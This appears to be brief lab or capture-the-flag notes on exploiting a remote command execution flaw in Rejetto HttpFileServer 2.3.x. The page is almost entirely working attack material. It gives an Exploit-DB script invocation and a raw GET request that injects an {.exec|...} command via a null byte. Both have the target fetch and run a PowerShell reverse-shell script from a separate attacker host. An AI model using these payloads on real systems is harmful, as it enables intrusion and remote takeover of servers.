____

Rejetto HttpFileServer 2.3.x - Remote Command Execution

# Exploit

/usr/share/exploitdb/exploits/windows/webapps/49125.py

```bash
python3 49125.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.26/Invoke-PowerShellTcp.ps1')"
```

or GET,

```
http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.26/Invoke-PowerShellTcp.ps1').}
```
